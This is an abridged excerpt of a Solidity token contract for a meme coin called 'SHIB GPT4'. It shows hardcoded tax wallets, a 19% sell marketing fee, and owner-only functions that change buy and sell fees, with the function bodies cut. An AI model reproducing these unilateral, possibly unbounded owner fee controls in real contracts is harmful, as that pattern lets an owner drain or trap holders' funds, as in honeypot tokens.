...
contract SHIBGPT4 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = unicode"SHIB GPT4";
    string private _symbol = unicode"$SHIBGPT4";
    uint8 private _decimals = 9;

    address payable private taxWallet1 = payable(0xBC1603274Ba771bDC22281f9e102F8DF497a8D51);
    address payable private taxWallet2 = payable(0xBC1603274Ba771bDC22281f9e102F8DF497a8D51);
    ...
    uint256 public _sellMarketingFees = 19;
    ...
    function SetMarketPair(address account) public onlyOwner {
        checkMarketPair[account] = true;
    }
    

    function BuyFee(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
    ...
    function SellFee(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
